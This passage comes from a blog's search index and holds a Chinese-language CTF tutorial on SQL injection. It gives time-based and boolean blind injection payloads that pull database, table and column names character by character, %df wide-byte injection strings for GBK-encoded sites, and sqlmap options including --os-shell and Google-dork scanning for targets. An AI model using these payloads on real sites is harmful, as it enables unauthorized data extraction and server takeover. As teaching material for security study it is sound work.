plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,1,sleep(10))-- +</span><br></pre></td></tr></table></figure><h5 id="3-获取数据表"><a href="#3-获取数据表" class="headerlink" title="3.获取数据表"></a>3.获取数据表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot;limit 0,1),1,1)))=101,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><hr><h3 id="4-布尔注入"><a href="#4-布尔注入" class="headerlink" title="4.布尔注入"></a>4.布尔注入</h3><p>判断是否存在布尔盲注(一般页面屏蔽了错显，正确类错误类都返回对应相同的页面)—-布尔注入(mysql5.0及以上自带库信息，利用ascii转换数字判断，为了更快捷的获取结果，利用工具burp suit快速组合）</p><h5 id="1-判断是否存在布尔盲注"><a href="#1-判断是否存在布尔盲注" class="headerlink" title="1.判断是否存在布尔盲注"></a>1.判断是否存在布尔盲注</h5><p><code>order by 1,2… </code>判断当前字段数，<code>union select 1,2 …</code> 查询成功但是发现无输出点展示，结论：屏蔽联合查询输出点，可能使用布尔盲注能注入</p><h5 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h5><p>可手工，也可利用工具brupsuit，提高效率。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(table_name) from information_Schema.tables where table_schema=database())=3 </span><br></pre></td></tr></table></figure><p>可通过大于小于快速锁定范围，查看库，查看库里表名数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(table_name) from information_Schema.tables where table_schema=database() limit 0,1)=6</span><br></pre></td></tr></table></figure><p>这里可以通过<code>length()</code>函数可以查看第一个表名的字符数长度为6，然后可以limit 一条条看名表字符长度.此刻我们知道表的长度及库名，我们可通过ascii函数转变为数字来判断,一个一个字符来确认表名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select table_name from information_Schema.tables where table_schema=database() limit 0,1),1,1))</span><br><span class="line">=108</span><br></pre></td></tr></table></figure><p>这里可以确认第一个字符为108，<code>substr(str，起始位，截取位数)</code>截取函数，sacii（str）函数将单个字符转化为十六进制数字.</p><p>同样得方法可以获得字段及记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select column_name from information_Schema.columns where table_Schema=database() and table_name=“xxx” limit 0,1),1,1))=90 获取字段</span><br><span class="line">and ascii(substr((select xxx from xxx limit 0,1),1,1))=90 获取数据</span><br></pre></td></tr></table></figure><hr><h3 id="5-宽字节注入"><a href="#5-宽字节注入" class="headerlink" title="5.宽字节注入"></a>5.宽字节注入</h3><p>前提</p><ol><li><p>使用了addslashes()函数</p></li><li><p>数据库设置了编码模式为GBK</p></li></ol><p>原理：前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=%df&#x27; and 1=1 --+</span><br><span class="line">?id=%df&#x27; and 1=2 --+</span><br><span class="line">?id=-1%df&#x27; union select 1,2,3 %23</span><br></pre></td></tr></table></figure><hr><h3 id="6-sqlmap"><a href="#6-sqlmap" class="headerlink" title="6.sqlmap"></a>6.sqlmap</h3><h5 id="1-get注入"><a href="#1-get注入" class="headerlink" title="1.get注入"></a>1.get注入</h5><p>-u “url”    检测注入点<br>–dbs       列出所有数据库的名字<br>–current-db    列出当前数据的名<br>-D      指定一个数据库<br>–tables    列出表名<br>-T  指定表名<br>–columns   列出所有字段名<br>-C  指定字段<br>–dump  列出字段内容</p><h5 id="2-post注入"><a href="#2-post注入" class="headerlink" title="2.post注入"></a>2.post注入</h5><p>-r post.txt 从文件中读入http请求（post.txt是用burpsuite抓取得post数据包构成）<br>–os-shell  获取shell<br>sqlmap -g “inurl:php?id&#x3D;”   利用google 自动搜索注入点</p><h5 id="3-携带cookie-的认证"><a href="#3-携带cookie-的认证" class="headerlink" title="3.携带cookie 的认证"></a>3.携带cookie 的认证</h5><p>要测试的页面只有在登录状态下才能访问，登录状态用cookie识别<br>–cookie “”</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[#footer {    background: transparent !important;}#page-header{    background: transparent !important;}#footer::before{    background: transparent !important;}#page-header::before{    background: transparent !important;}[data-theme="dark"] #footer::before{    background: transparent !important;}[data-theme="dark"] #page-header::before{    background: transparent !important;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
